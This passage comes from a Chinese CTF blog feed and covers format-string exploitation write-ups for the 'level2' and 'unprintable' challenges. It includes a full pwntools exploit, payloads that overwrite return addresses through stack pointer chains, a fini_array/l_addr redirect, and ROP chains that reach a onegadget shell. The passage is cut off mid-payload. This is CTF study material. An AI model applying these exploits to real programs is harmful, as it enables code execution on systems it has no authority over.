punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc_base => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>system_addr<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>binsh_addr<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'system_addr => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'binsh_addr => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>payload<span class="token operator">=</span>p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;这一次来记载一些题目吧~&lt;/p&gt;
&lt;p&gt;先从最近的题目开始&lt;/p&gt;
&lt;h2 id=&quot;0x1-太湖杯-easykooc&quot;&gt;&lt;a href=&quot;#0x1-太湖杯-easykooc&quot; class=&quot;headerlink&quot; title=&quot;0x1.太湖杯-easykooc&quot;&gt;&lt;/a&gt;0
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://lawliet.ren/categories/CTF/"/>
    
    
      <category term="PWN" scheme="https://lawliet.ren/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>七星计划(1)</title>
    <link href="https://lawliet.ren/2020/11/03/qi-xing-ji-hua-1/"/>
    <id>https://lawliet.ren/2020/11/03/qi-xing-ji-hua-1/</id>
    <published>2020-11-03T14:14:49.000Z</published>
    <updated>2020-11-15T04:55:44.277Z</updated>
    
    <content type="html"><![CDATA[<p>一直对格式化字符串的利用不是很上手，所以决定做个总结，复现一些骚题目还有一些常规题，bss段的格式化字符串和正常的栈上的格式化字符串利用，希望通过这次总结能加深对格式化字符串利用的理解。</p><h2 id="0x1-ha1cyon-ctf-level2"><a href="#0x1-ha1cyon-ctf-level2" class="headerlink" title="0x1.ha1cyon-ctf level2"></a>0x1.ha1cyon-ctf level2</h2><p>除了canary以外保护全开</p><p>IDA分析</p><p><a href="https://imgchr.com/i/B6ez3q" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/03/B6ez3q.jpg" alt="B6ez3q.jpg"></a></p><p>无限循环的格式化字符串漏洞，不过是bss段的。</p><p>bss段或堆上的的格式化字符串利用，我们需要在栈上找一个二级指针，类似于下面这种</p><p><a href="https://imgchr.com/i/B6nFQP" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/03/B6nFQP.jpg" alt="B6nFQP.jpg"></a></p><p>因为我们需要修改返回地址，但通过格式化字符串漏洞直接修改返回地址是行不通的，我们需要间接修改返回地址，如下</p><pre class=" language-assembly"><code class="language-assembly">00:0000│ rsp  0x7fffffffde08 —▸ 0x555555554824 (main+138) ◂— jmp    0x5555555547da01:0008│ rbp  0x7fffffffde10 —▸ 0x555555554830 (__libc_csu_init) ◂— push   r1502:0010│      0x7fffffffde18 —▸ 0x7ffff7a05b97 (__libc_start_main+231) ◂— mov    edi, eax03:0018│      0x7fffffffde20 ◂— 0x104:0020│      0x7fffffffde28 —▸ 0x7fffffffdef8 —▸ 0x7fffffffe264 ◂— 0x6f6c2f656d6f682f ('/home/lo')有这样一条链0x7fffffffde28 —▸ 0x7fffffffdef8 —▸ 0x7fffffffe264 ◂— 0x6f6c2f656d6f682f ('/home/lo')我们可以将这条链指向返回地址，即修改成如下所示的链0x7fffffffde28 —▸ 0x7fffffffdef8 —▸ 0x7fffffffde18 —▸ 0x7ffff7a05b97 (__libc_start_main+231) ◂— mov edi, eax0x7fffffffe264和0x7fffffffde18只有后四位不同，通过格式化字符串我们可以修改0x7fffffffe264的后四位为0x7fffffffde18的后四位，这样我们就能通过修改栈上的值来修改返回地址了</code></pre><p>首先我们泄露出libc地址和栈地址，这两个地址分别用<code>%7$p</code>和<code>%9$p</code>就能泄露</p><p>接着我们来完成上面说的修改栈链</p><pre><code>0x7fffffffde28 —▸ 0x7fffffffdef8 —▸ 0x7fffffffe264 ◂— 0x6f6c2f656d6f682f ('/home/lo')</code></pre><p>这条链在格式化字符串中是<code>%9</code><br>我们通过如下payload来修改它的指向</p><pre class=" language-python"><code class="language-python">payload <span class="token operator">=</span> <span class="token string">"%"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>stack<span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"c"</span><span class="token operator">+</span><span class="token string">"%9$hnxxxx\x00"</span></code></pre><p>修改完成后如下</p><p><a href="https://imgchr.com/i/B6sWVO" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/04/B6sWVO.jpg" alt="B6sWVO.jpg"></a></p><p>这样栈里面就存在了指向返回地址的二级指针，我们只要修改<code>00f0</code>处栈所指向的值就能修改返回地址了。</p><p>由于返回地址和onegadget地址只有后五位不一样，所以我们只需要通过格式化字符串修改返回地址得后三个字节即可，不用全部写入。</p><p>00f0的栈在格式化字符串中的位置是<code>%35</code>，我们第一次修改两字节，也就是用<code>%35$hn</code>进行写入，payload如下</p><pre class=" language-python"><code class="language-python">payload <span class="token operator">=</span> <span class="token string">"%"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>onegadget <span class="token operator">&amp;</span> <span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"c"</span><span class="token operator">+</span><span class="token string">"%35$hnxxxx\x00"</span></code></pre><p>修改后如下所示</p><p><a href="https://imgchr.com/i/B6yKQ1" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/04/B6yKQ1.jpg" alt="B6yKQ1.jpg"></a></p><p>接着我们来修改剩下的两字节。</p><p>我们需要再次修改<code>0020</code>处的栈链，使其偏移四位，即现在是<code>0x7ffe5519af48</code>,我们将其修改为<code>0x7ffe5519af4a</code>，这样就能够修改后四位的值，payload为</p><pre class=" language-python"><code class="language-python">payload <span class="token operator">=</span> <span class="token string">"%"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>stack<span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"c"</span><span class="token operator">+</span><span class="token string">"%9$hnxxxx\x00"</span> <span class="token comment" spellcheck="true">#因为是以字节为单位偏移，所以+2就是偏移两字节，即偏移四位</span></code></pre><p>修改了偏移之后就可以继续修改%35的栈值，进行最后的修改</p><pre class=" language-python"><code class="language-python">payload <span class="token operator">=</span> <span class="token string">"%"</span><span class="token operator">+</span>str<span class="token punctuation">(</span><span class="token punctuation">(</span>onegadget <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"c"</span><span class="token operator">+</span><span class="token string">"%35$hnxxxx\x00"</span></code></pre><p>修改完成后栈如下</p><p><a href="https://imgchr.com/i/B66R4e" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/04/B66R4e.jpg" alt="B66R4e.jpg"></a></p><p>返回地址已经被修改为了onegadget，然后输入66666666退出循环就能触发onegadget，完整exp如下</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./level2"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'level2'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'libc-2.27_x64.so'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">"%6$p%7$p%9$p"</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>pro_base <span class="token operator">=</span> int<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x830</span>libc_base <span class="token operator">=</span> int<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">231</span>stack <span class="token operator">=</span> int<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">232</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'pro_base => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>pro_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc_base => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'stack => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>stack<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>onegadget <span class="token operator">=</span> libc_base<span class="token operator">+</span><span class="token number">0x4f322</span>offset0 <span class="token operator">=</span> stack <span class="token operator">&amp;</span> <span class="token number">0xffff</span>offset1 <span class="token operator">=</span> onegadget <span class="token operator">&amp;</span> <span class="token number">0xffff</span>offset2 <span class="token operator">=</span> <span class="token punctuation">(</span>onegadget <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffff</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'onegadget => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>onegadget<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'offset0 => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>offset0<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'offset1 => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>offset1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'offset2 => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>offset2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(io)</span>payload <span class="token operator">=</span> <span class="token string">"%"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>offset0<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"c"</span><span class="token operator">+</span><span class="token string">"%9$hnxxxx\x00"</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"xxxx"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">"%"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>offset1<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"c"</span><span class="token operator">+</span><span class="token string">"%35$hnxxxx\x00"</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"xxxx"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">"%"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>offset0<span class="token operator">+</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"c"</span><span class="token operator">+</span><span class="token string">"%9$hnxxxx\x00"</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"xxxx"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">"%"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>offset2<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"c"</span><span class="token operator">+</span><span class="token string">"%35$hnxxxx\x00"</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"xxxx"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"66666666\x00"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="0x2-De1ta-ctf-unprintable"><a href="#0x2-De1ta-ctf-unprintable" class="headerlink" title="0x2.De1ta ctf-unprintable"></a>0x2.De1ta ctf-unprintable</h2><p>这题可以说是上一题的升级版</p><p>首先检查保护</p><p><a href="https://imgchr.com/i/B6c9bV" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/04/B6c9bV.jpg" alt="B6c9bV.jpg"></a></p><p>IDA分析</p><p><a href="https://imgchr.com/i/B66L4g" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/04/B66L4g.jpg" alt="B66L4g.jpg"></a></p><p>程序首先给我们了栈地址，然后关闭标准输出，只有一次格式化字符串利用机会，之后就通过exit函数退出</p><p>由于第一次printf调用栈中不存在可利用的数据</p><p><a href="https://imgchr.com/i/BvEmhF" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/11/BvEmhF.png" alt="BvEmhF.png"></a></p><p>根据上一题修改返回地址的利用，我们无法通过第一次printf直接修改返回地址，因此需要利用别的办法</p><p>在exit函数中会调用_dl_fini函数</p><p><a href="https://imgchr.com/i/BcC6qs" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/04/BcC6qs.jpg" alt="BcC6qs.jpg"></a></p><p>其中的<code>l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr</code>指向<code>fini_array</code>段的地址，而<code>l-&gt;l_addr</code>为0，所以<code>l-&gt;l_addr+ l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr</code>=0x600DD8</p><p>在printf函数下断点，此时栈空间如下</p><p><a href="https://imgchr.com/i/BvFIHK" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/11/BvFIHK.png" alt="BvFIHK.png"></a></p><p>这个画框的实际上就是<code>l-&gt;l_addr</code></p><p>在后续调用_dl_fini的过程中，有如下语句</p><p><a href="https://imgchr.com/i/BvA9qx" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/11/BvA9qx.png" alt="BvA9qx.png"></a></p><p><code>_dl_fini</code>+788这条语句将[rbx]和r12相加，rbx里面存储的是fini_array的地址，rbx里面存储着的正是<code>l-&gt;l_addr</code>，也就是调用printf时栈中<code>_dl_init</code>+139上一行的值。因此我们可以通过格式化字符串修改<code>l-&gt;l_addr</code>的值，使<code>l-&gt;l_addr+ l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr</code>偏移到buf中，然后在buf中伪造fini_array里面的函数为main函数，这样就能够再次执行程序。</p><p><code>l-&gt;l_addr</code>在printf中的偏移为%26，buf的地址为<code>0x601060</code>，fini_array的地址是<code>0x600dd8</code>，相差0x288，payload如下</p><pre class=" language-python"><code class="language-python">payload <span class="token operator">=</span> <span class="token string">"%"</span><span class="token operator">+</span>str<span class="token punctuation">(</span><span class="token number">0x298</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"c%26$hn"</span>payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x4007A3</span><span class="token punctuation">)</span></code></pre><p>因为我们输入的格式化字符要占一定空间，所以伪造的fini_array还需要往后挪一挪。伪造的fini函数直接从main函数中的read函数开始执行，这是为了避免从头执行会再一次初始化栈空间，这样我们做的就是无用功。</p><p>看到第二次执行printf时的栈空间</p><p><a href="https://imgchr.com/i/BvAb6A" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/11/BvAb6A.png" alt="BvAb6A.png"></a></p><p>此时我们就可以直接通过格式化字符串来修改返回地址了</p><p>接下来的利用思路就是在buf中写入ROP链，rop用来修改stderr为onegadget，格式化字符串用来修改printf函数的返回地址为pop rsp，将返回地址的下一行修改为rop链的起始地址，这样当printf函数结束时就会执行rop链。</p><p>用到的gadget如下</p><pre class=" language-python"><code class="language-python">pop_rsp <span class="token operator">=</span> <span class="token number">0x000000000040082d</span><span class="token comment" spellcheck="true">#0x000000000040082d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span>csu_pop <span class="token operator">=</span> <span class="token number">0x000000000040082A</span><span class="token triple-quoted-string string">'''.text:000000000040082A                 pop     rbx.text:000000000040082B                 pop     rbp.text:000000000040082C                 pop     r12.text:000000000040082E                 pop     r13.text:0000000000400830                 pop     r14.text:0000000000400832                 pop     r15.text:0000000000400834                 retn'''</span>csu_call <span class="token operator">=</span> <span class="token number">0x0000000000400810</span><span class="token triple-quoted-string string">'''.text:0000000000400810                 mov     rdx, r13.text:0000000000400813                 mov     rsi, r14.text:0000000000400816                 mov     edi, r15d.text:0000000000400819                 call    ds:(__frame_dummy_init_array_entry - 600DD0h)[r12+rbx*8]'''</span><span class="token comment" spellcheck="true">#万能gadget</span>stderr_ptr_addr <span class="token operator">=</span> <span class="token number">0x0000000000601040</span>stdout_ptr_addr <span class="token operator">=</span> <span class="token number">0x0000000000601020</span>adc_p_rbp_edx <span class="token operator">=</span> <span class="token number">0x00000000004006E8</span><span class="token triple-quoted-string string">'''.text:00000000004006E8 adc     [rbp+48h], edx.text:00000000004006EB mov     ebp, esp.text:00000000004006ED call    deregister_tm_clones.text:00000000004006F2 pop     rbp.text:00000000004006F3 mov     cs:completed_7594, 1.text:00000000004006FA rep retn'''</span></code></pre><p><code>adc     [rbp+48h], edx</code>这一条gadget可以用来的意思是将edx的值和[rbp+0x48]的值相加，并将结果存储在rbp+0x48中，我们可以将edx的值设置为onegadget和<code>_IO_2_1_stderr</code>的地址的差，将rbp设置为<code>stderr_ptr_addr-0x48</code>，于是通过这条指令就可以将<code>_IO_2_1_stderr</code>改写为onegadget。</p><p>现在开始完整的讲述利用流程，在第二次printf中，栈空间如下</p><pre class=" language-assembly"><code class="language-assembly">00:0000│ rsp  0x7ffdcc6a2410 —▸ 0x4007c6 (main+160) ◂— mov    edi, 001:0008│      0x7ffdcc6a2418 —▸ 0x7fb6ff903e27 (_dl_fini+823) ◂— test   r13d, r13d02:0010│ r14  0x7ffdcc6a2420 —▸ 0x7fb6ffb1a168 ◂— 0x29803:0018│      0x7ffdcc6a2428 —▸ 0x7fb6ffb1a700 —▸ 0x7ffdcc763000 ◂— jg     0x7ffdcc76304704:0020│      0x7ffdcc6a2430 —▸ 0x7fb6ffafc000 —▸ 0x7fb6ff529000 ◂— jg     0x7fb6ff52904705:0028│ r10  0x7ffdcc6a2438 —▸ 0x7fb6ffb199d8 (_rtld_global+2456) —▸ 0x7fb6ff8f3000 ◂— jg     0x7fb6ff8f304706:0030│      0x7ffdcc6a2440 —▸ 0x7ffdcc6a2540 —▸ 0x4007d0 (__libc_csu_init) ◂— push   r1507:0038│      0x7ffdcc6a2448 —▸ 0x7fb6ff903b74 (_dl_fini+132) ◂— mov    ecx, dword ptr [r12]08:0040│      0x7ffdcc6a2450 —▸ 0x7ffdcc6a2420 —▸ 0x7fb6ffb1a168 ◂— 0x29809:0048│      0x7ffdcc6a2458 ◂— 0x30000000100a:0050│      0x7ffdcc6a2460 —▸ 0x7ffdcc6a2530 —▸ 0x7ffdcc6a2620 ◂— 0x10b:0058│      0x7ffdcc6a2468 —▸ 0x7ffdcc6a2470 —▸ 0x7ffdcc763280 ◂— add    byte ptr ss:[rax], al /* '6' */0c:0060│      0x7ffdcc6a2470 —▸ 0x7ffdcc763280 ◂— add    byte ptr ss:[rax], al /* '6' */0d:0068│      0x7ffdcc6a2478 —▸ 0x7ffdcc6a2450 —▸ 0x7ffdcc6a2420 —▸ 0x7fb6ffb1a168 ◂— 0x2980e:0070│      0x7ffdcc6a2480 ◂— 0x4000010000f:0078│      0x7ffdcc6a2488 —▸ 0x7ffdcc6a2420 —▸ 0x7fb6ffb1a168 ◂— 0x29810:0080│      0x7ffdcc6a2490 ◂— 0x40000000011:0088│      0x7ffdcc6a2498 —▸ 0x7fb6ffb19048 (_rtld_global+8) ◂— 0x412:0090│      0x7ffdcc6a24a0 —▸ 0x7ffdcc6a2410 —▸ 0x4007c6 (main+160) ◂— mov    edi, 0</code></pre><p>通过0090的栈我们可以修改返回地址，使程序重复读取，我们还需要将0008处的栈修改为rop链的存储地址</p><pre class=" language-assembly"><code class="language-assembly">01:0008│      0x7ffdcc6a2418 —▸ 0x7fb6ff903e27 (_dl_fini+823) ◂— test   r13d, r13d08:0040│      0x7ffdcc6a2450 —▸ 0x7ffdcc6a2420 —▸ 0x7fb6ffb1a168 ◂— 0x2980d:0068│      0x7ffdcc6a2478 —▸ 0x7ffdcc6a2450 —▸ 0x7ffdcc6a2420 —▸ 0x7fb6ffb1a168 ◂— 0x298看到上面这三条栈链，类似于第一题的做法，我们将0d:0068│      0x7ffdcc6a2478 —▸ 0x7ffdcc6a2450 —▸ 0x7ffdcc6a2420 —▸ 0x7fb6ffb1a168 ◂— 0x298修改为0d:0068│      0x7ffdcc6a2478 —▸ 0x7ffdcc6a2450 —▸ 0x7ffdcc6a2418 —▸ 0x7fb6ff903e27 (_dl_fini+823) ◂— test   r13d, r13d0040处的栈就变成了08:0040│      0x7ffdcc6a2450 —▸ 0x7ffdcc6a2418 —▸ 0x7fb6ff903e27 (_dl_fini+823) ◂— test   r13d, r13d这样我们就能通过修改0040处的栈来修改0008处的栈值了</code></pre><p>payload如下</p><pre class=" language-python"><code class="language-python">payload <span class="token operator">=</span> <span class="token string">'%'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span><span class="token number">0xA3</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%23$hhn'</span><span class="token comment" spellcheck="true">#修改返回地址为0x4007a3</span>payload <span class="token operator">+=</span> <span class="token string">'%'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span><span class="token punctuation">(</span>stack<span class="token number">-0xa3</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xff</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%18$hhn'</span><span class="token comment" spellcheck="true">#修改0068得栈链指向0008处，这里减a3得原因是因为前面已经输出了0xa3个字节了，如果不减的话%18处得栈的后四位就会被修改为stack&amp;0xffff+0xa3</span></code></pre><p>修改之前如下</p><p><a href="https://imgchr.com/i/BvEYtO" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/11/BvEYtO.png" alt="BvEYtO.png"></a></p><p>修改之后如下</p><p><a href="https://imgchr.com/i/BvV9UK" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/11/BvV9UK.png" alt="BvV9UK.png"></a></p><p>可以看到返回地址已经被修改为了0x4007a3，栈链也修改成功</p><p>下一步继续修改0008处的值，payload如下</p><pre class=" language-python"><code class="language-python">stack <span class="token operator">=</span> stack<span class="token operator">+</span><span class="token number">2</span> payload <span class="token operator">=</span> <span class="token string">'%'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span><span class="token number">0xA3</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%23$hhn'</span><span class="token comment" spellcheck="true">#修改返回地址</span>tmp1 <span class="token operator">=</span> <span class="token punctuation">(</span>stack<span class="token number">-0xa3</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xff</span>payload <span class="token operator">+=</span> <span class="token string">'%'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>tmp1<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%18$hhn'</span><span class="token comment" spellcheck="true">#修改0068处的栈链</span>tmp2 <span class="token operator">=</span> tmp1<span class="token operator">+</span><span class="token number">0xa3</span>payload <span class="token operator">+=</span> <span class="token string">'%'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span><span class="token punctuation">(</span>addr1<span class="token operator">-</span>tmp2<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%13$hn'</span><span class="token comment" spellcheck="true">#修改0008处栈的值</span></code></pre><p>修改前</p><p><a href="https://imgchr.com/i/BvVF8e" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/11/BvVF8e.png" alt="BvVF8e.png"></a></p><p>修改后</p><p><a href="https://imgchr.com/i/BvVB24" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/11/BvVB24.png" alt="BvVB24.png"></a></p><p>可以看到0008处栈的值的后四位被修改为了rop链存放地址的后四位</p><p>接下来继续修改，payload如下</p><pre class=" language-python"><code class="language-python">stack <span class="token operator">=</span> stack<span class="token operator">+</span><span class="token number">2</span>payload <span class="token operator">=</span> <span class="token string">'%'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%13$hn'</span>payload <span class="token operator">+=</span> <span class="token string">'%'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span><span class="token number">0xA3</span><span class="token operator">-</span><span class="token number">0x60</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%23$hhn'</span>tmp1 <span class="token operator">=</span> <span class="token punctuation">(</span>stack<span class="token number">-0xa3</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xff</span>payload <span class="token operator">+=</span> <span class="token string">'%'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>tmp1<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%18$hhn'</span></code></pre><p>修改后如下</p><p><a href="https://imgchr.com/i/BvVTsA" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/11/BvVTsA.png" alt="BvVTsA.png"></a></p><p>接下来是最后一次payload，要将0008处前面的0x7fec清零，修改返回地址为pop rsp的地址，还要将rop链写入</p><pre class=" language-python"><code class="language-python">payload <span class="token operator">=</span> <span class="token string">'%13$hn'</span>payload <span class="token operator">+=</span> <span class="token string">'%'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>pop_rsp<span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%23$hn'</span>payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> 